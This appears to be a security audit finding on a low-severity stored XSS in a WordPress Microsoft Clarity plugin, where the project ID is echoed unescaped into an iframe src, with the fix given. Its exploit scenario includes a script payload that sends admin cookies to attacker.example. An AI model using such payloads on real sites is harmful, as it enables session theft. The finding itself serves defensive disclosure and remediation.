# MC-001: Admin-Only Stored XSS via Unescaped clarity_project_id in iframe src Attribute

## Severity: Low (CVSS 4.4 — admin-only precondition)
## Vulnerability Class: Stored Cross-Site Scripting (XSS)
## Unauthenticated: No (requires administrator / manage_options)

## Location

- **File**: `clarity-page.php`
- **Line**: 340, 351
- **Flow ID**: `microsoft-clarity-xss-001`

## Description

`clarity_section_iframe_callback()` outputs the `clarity_project_id` option into an HTML iframe `src` attribute without escaping:

```php
// Line 340
$iframe_src = $iframe_src . "&project=" . $clarity_project_id_option;

// Line 351 (output)
<iframe ... src="<?php echo $iframe_src ?>" ...>
```

`$iframe_src` is built by concatenating several fixed parts with the unescaped `$clarity_project_id_option`. A project ID containing `"` or `>` can break out of the attribute, and a value beginning with `javascript:` could turn the `src` into a javascript URI executed when the iframe loads.

## Taint Chain

```
get_option('clarity_project_id')          [line 300]
  → $clarity_project_id_option
  → $iframe_src .= "&project=" . $clarity_project_id_option  [line 340]
  → echo $iframe_src inside src="..."     [line 351]
```

## Attack Prerequisites

1. The attacker must be an **administrator** (requires `manage_options` capability).
2. The write path is the nonce-verified `wp_ajax_edit_clarity_project_id` AJAX handler (clarity-page.php lines 484-518), which stores any value via `update_option('clarity_project_id', $new_value)` without sanitizing `$new_value` before storage.
3. The XSS fires when any user with `edit_posts` capability visits **wp-admin/admin.php?page=microsoft-clarity**.

## Exploit Scenario

1. Attacker is already an administrator (or uses a separate privilege-escalation bug).
2. Send authenticated POST to `wp-admin/admin-ajax.php`:
   ```
   action=edit_clarity_project_id
   nonce=<valid_nonce>
   new_value="><script>document.location='https://attacker.example/steal?c='+document.cookie</script>
   ```
3. Any administrator (or editor-level user) visiting the Clarity admin page will have the script execute in their browser.

## Impact

- Session cookie theft for any administrator who views the Clarity page.
- Within WordPress's security model, admins already have full site access, so this is a low-priority issue unless it can be chained with a lower-privileged write primitive.
- Severity is Low under WordPress's policy that admin-only issues are generally considered out of scope.

## Remediation

Apply `esc_attr()` before echoing the iframe src:

```php
// clarity-page.php line 351 — fix
<iframe ... src="<?php echo esc_attr( $iframe_src ); ?>" ...>
```

Alternatively sanitize at storage time in `edit_clarity_project_id()`:

```php
$new_value = sanitize_text_field( $_POST['new_value'] );
update_option( 'clarity_project_id', $new_value );
```

Note: `$_GET['iframeRedirect']` appended at line 346 is NOT a vector here — it is passed through `sanitize_text_field()` and then `rawurlencode()`, preventing attribute breakout.
